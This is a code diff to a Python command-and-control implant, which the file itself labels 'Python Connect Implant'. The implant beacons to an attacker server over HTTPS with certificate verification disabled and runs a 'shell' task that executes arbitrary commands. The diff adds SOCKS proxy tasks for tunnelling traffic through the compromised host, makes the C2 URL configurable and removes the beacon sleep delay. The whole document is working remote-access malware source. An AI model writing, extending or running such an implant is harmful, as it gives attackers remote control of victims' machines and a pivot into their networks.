@@ -5,6 +5,8 @@ import random
 import requests
 import subprocess
 import sys
+import socket
+import select
 import time
 import urllib3
 
@@ -14,6 +16,30 @@ AgentOption = namedtuple('AgentOption', ['name', 'description', 'parameters','ty
 Parameter = namedtuple('Parameter', ['name', 'description'])
 
 routes = ['the', 'bird', 'is', 'a', 'nerd', 'd', 'juice']
+
+proxies = []
+
+def sleep():
+    return 0
+    #return random.randint(5, 10)
+
+def base64_to_bytes(data) -> bytes:
+    """
+    Base64 encode a bytes object.
+    :param data: A base64 string.
+    :return: A bytes object.
+    :rtype: bytes
+    """
+    return base64.b64decode(data)
+
+def bytes_to_base64(data) -> str:
+    """
+    Base64 encode a bytes object.
+    :param data: A python bytes object.
+    :return: A base64 encoded string
+    :rtype: str
+    """
+    return base64.b64encode(data).decode('utf-8')
 
 def base64_to_string(data) -> str:
     """
@@ -36,13 +62,13 @@ def string_to_base64(data) -> str:
 def post(url, data, route=''):
     if not route:
         route = routes[random.randint(0, len(routes) - 1)]
-    return requests.post(f'https://192.168.1.15:8080/{route}', data, verify=False).text
-
+    return requests.post(f'{url}{route}', data, verify=False).text
 
 def main(url, key):
     batch_response = ''
     check_in_task_id = ''
     while True:
+        #print(batch_response)
         try:
             if not check_in_task_id:
                 route = key
@@ -60,13 +86,12 @@ def main(url, key):
                 },
                 "id": check_in_task_id
             }]
-            time.sleep(random.randint(5, 10))
+            time.sleep(sleep())
             continue
 
         try:
             batch_response = []
             for task in batch_request:
-                print(task)
                 id = task['id']
                 name = task['name']
                 parameters = task['parameters']
@@ -76,8 +101,40 @@ def main(url, key):
                     if name == 'check_in':
                         check_in_task_id = id
                         continue
+                    if name == 'socks_connect':
+                        remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        #remote.settimeout(5.0)
+                        try:
+                            remote.connect((parameters[0], int(parameters[1])))
+                            rep = 0
+                        except socket.timeout:
+                            rep = 4
+                        except Exception:
+                            rep = 1
+
+                        atype = parameters[2]
+                       
+                        if rep != 0:
+                            results = json.dumps({'remote':'-1','rep':f'{rep}','atype':f'{atype}','bind_addr':'','bind_port':''})
+                        else:
+                            proxies.append(remote)
+                            bind_addr = remote.getsockname()[0]
+                            bind_port = remote.getsockname()[1]
+                            results = json.dumps({'remote':f'{proxies.index(remote)}','rep':f'{rep}','atype':f'{atype}','bind_addr':f'{bind_addr}','bind_port':f'{bind_port}'})
+                    if name == 'socks_upstream':
+                        remote = proxies[int(parameters[0])]
+                        upstream_data = base64_to_bytes(parameters[1])
+                        remote.sendall(upstream_data)
+                        results = 'sent succesfully'
+                    if name == 'socks_downstream':
+                        remote = proxies[int(parameters[0])]
+                        sid = parameters[1]
+                        r, w, e = select.select([remote], [], [])
+                        downstream_data = b''
+                        if r:
+                            downstream_data += remote.recv(4096)
+                            results = json.dumps({'remote':f'{proxies.index(remote)}','sid':f'{sid}','downstream_data':f'{bytes_to_base64(downstream_data)}'})
                     if name == 'shell':
-                        print(parameters)
                         results = subprocess.run(parameters, capture_output=True, text=True).stdout
                     if not results:
                         batch_response.extend([{
@@ -117,7 +174,7 @@ def main(url, key):
             "result": 'checking in',
             "id": check_in_task_id
         }])
-        time.sleep(random.randint(5, 10))
+        time.sleep(sleep())
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser('Python Connect Implant', 'Python Connect Implant', conflict_handler='resolve')
